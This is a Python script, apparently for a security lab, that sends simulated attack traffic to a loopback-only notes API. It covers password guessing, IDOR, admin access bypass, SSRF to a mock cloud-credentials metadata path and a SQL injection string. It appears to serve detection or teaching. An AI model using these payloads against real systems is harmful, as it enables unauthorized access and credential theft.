#!/usr/bin/env python3
"""AUTHORIZED LAB USE ONLY.

Generates simulated adversary-like HTTP traffic against the local notes API.
Refuses any target that is not loopback.
"""

from __future__ import annotations

import argparse
import json
import sys
import urllib.error
import urllib.parse
import urllib.request

BANNER = "AUTHORIZED LAB USE ONLY — local lab target required"


def assert_local(base: str) -> None:
    parsed = urllib.parse.urlparse(base)
    host = (parsed.hostname or "").lower()
    if host not in {"127.0.0.1", "localhost", "::1"}:
        sys.exit(f"Refusing non-local target {base!r}. {BANNER}")
    if parsed.scheme != "http":
        sys.exit("Refusing non-http target. Use the local lab http endpoint.")


def request(base: str, method: str, path: str, token: str | None = None, data: dict | None = None, query: dict | None = None) -> tuple[int, str]:
    url = base.rstrip("/") + path
    if query:
        url += "?" + urllib.parse.urlencode(query)
    body = None
    headers = {"Accept": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    if data is not None:
        body = json.dumps(data).encode()
        headers["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode()


def login(base: str, username: str, password: str) -> str:
    code, body = request(base, "POST", "/login", data={"username": username, "password": password})
    if code != 200:
        raise SystemExit(f"login failed for {username}: {code} {body}")
    return json.loads(body)["token"]


def scenario_brute_force(base: str) -> None:
    print("[*] T1110.001 password guessing (benign, will not succeed)")
    for i in range(6):
        code, _ = request(
            base,
            "POST",
            "/login",
            data={"username": "alice", "password": f"wrong-password-{i}"},
        )
        print(f"    attempt {i + 1}: HTTP {code}")


def scenario_idor(base: str) -> None:
    print("[*] Broken object-level authorization: Alice reads Bob's note 2")
    token = login(base, "alice", "alice-lab-password")
    code, body = request(base, "GET", "/notes/2", token=token)
    print(f"    GET /notes/2 -> HTTP {code}")
    print(f"    body: {body[:300]}")


def scenario_admin(base: str) -> None:
    print("[*] Broken function-level authorization: Alice calls /admin/users")
    token = login(base, "alice", "alice-lab-password")
    code, body = request(base, "GET", "/admin/users", token=token)
    print(f"    GET /admin/users -> HTTP {code}")
    print(f"    body: {body[:300]}")


def scenario_ssrf(base: str) -> None:
    print("[*] SSRF to synthetic metadata (T1552.005) — dummy credentials only")
    token = login(base, "alice", "alice-lab-password")
    code, body = request(
        base,
        "GET",
        "/fetch",
        token=token,
        query={"url": "http://mock-imds/latest/meta-data/iam/security-credentials/lab-role"},
    )
    print(f"    GET /fetch -> HTTP {code}")
    print(f"    body: {body[:400]}")


def scenario_injection(base: str) -> None:
    print("[*] Search injection (benign payload, local sqlite only)")
    token = login(base, "alice", "alice-lab-password")
    payload = "' OR owner = 'bob' OR title LIKE '"
    code, body = request(base, "GET", "/search", token=token, query={"q": payload})
    print(f"    GET /search -> HTTP {code}")
    print(f"    body: {body[:400]}")


SCENARIOS = {
    "brute_force": scenario_brute_force,
    "idor": scenario_idor,
    "admin": scenario_admin,
    "ssrf": scenario_ssrf,
    "injection": scenario_injection,
}


def main() -> None:
    parser = argparse.ArgumentParser(description=BANNER)
    parser.add_argument("--base", default="http://127.0.0.1:8080")
    parser.add_argument(
        "--scenario",
        default="all",
        choices=["all", *SCENARIOS],
    )
    args = parser.parse_args()
    print(BANNER)
    assert_local(args.base)
    names = SCENARIOS if args.scenario == "all" else [args.scenario]
    for name in names:
        print(f"\n=== {name} ===")
        SCENARIOS[name](args.base)
    print("\nNext: curl -s http://127.0.0.1:8090/ingest | python -m json.tool")


if __name__ == "__main__":
    main()
